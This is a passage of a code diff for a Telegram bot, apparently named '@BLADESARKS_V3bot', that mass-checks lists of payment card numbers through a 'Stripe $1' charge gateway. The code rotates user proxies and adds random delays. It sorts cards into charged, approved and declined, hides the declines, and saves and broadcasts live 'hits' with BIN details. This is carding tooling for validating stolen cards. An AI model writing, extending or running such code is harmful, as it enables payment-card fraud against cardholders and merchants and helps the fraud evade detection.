+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+        
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+        
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 10 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+            
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+            
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe $1\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except:
+                pass
+        
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+            
+            await asyncio.sleep(random.uniform(0.1, 0.3))
+            
+            async with semaphore:
+                await speed_controller.wait_if_needed()
+                start = time.time()
+                
+                # Get proxy for this card
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+                
+                result = await check_card_stripe_1usd(card, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+                
+                bin_info = await get_bin_info(card)
+                
+                status_category = result.get("status_category", "unknown")
+                
+                async with stats_lock:
+                    processed_count += 1
+                    
+                    if status_category == "charged":
+                        stats["charged"] += 1
+                        stats["approved"] += 1
+                        print(f"🔥 [CHARGED] {card[:20]}...")
+                    elif status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
+                    else:
+                        stats["declined"] += 1
+                        print(f"⚠️ [ERROR - DECLINED] {card[:20]}...")
+                    
+                    if processed_count % 10 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+                
+                # ONLY SEND RESULT FOR CHARGED OR APPROVED CARDS
+                if status_category in ["charged", "approved"]:
+                    ui, _ = format_stripe_1usd_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except:
+                        pass
+                    
+                    await save_hit_to_file(
+                        card=card, gateway="Stripe $1",
+                        response=result.get("message", "Approved"),
+                        price="$5.00",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+                    
+                    if status_category == "charged":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway="Stripe $1", card=card,
+                            response=result.get("message", "Charged"),
+                            price="$5.00",
+                            user=user_data, bin_info=bin_info, status_category="charged"
+                        )
+                        user_manager.increment_hits(u_id)
+                
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+        
+        # Process all cards
+        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
+        
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in stripe_1usd_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ Task error: {e}")
+                async with stats_lock:
+                    stats["declined"] += 1
+        
+        # Final summary
+        if u_id in stripe_1usd_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+            
+            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+            
+            summary = (
+                f"{skull_emoji} <b>Stripe $1 Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ 0\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            print(f"📊 Final summary sent to user {u_id}")
+        
+        return stats
+        
+    except Exception as e:
+        print(f"❌ Stripe $1 mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        stripe_1usd_active_tasks.pop(u_id, None)
+        print(f"🏁 [Stripe $1 Mass] Session ended for user {u_id}")
+
 # ============ NEW MASS CHECK WITH 3-POOL SYSTEM ============
 @check_gateway("paypal")
 async def mass_check_paypal_3pool(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -59363,9 +60353,8 @@ def main():
     app.add_handler(CommandHandler("globalmode", toggle_global_mode_command))
     app.add_handler(CommandHandler("globalmode_status", global_mode_status_command))
     
-    app.add_handler(CommandHandler("st", single_check_st1_gateway))
-    app.add_handler(CommandHandler("mst", mass_check_st1_gateway_command))
-    
+    app.add_handler(CommandHandler("st", single_check_stripe_1usd))
+    app.add_handler(CommandHandler("mst", mass_check_stripe_1usd_command))
     
     app.add_handler(MessageHandler(
     filters.REPLY & filters.COMMAND & (filters.Regex(r'^/(feedback|fb)')),
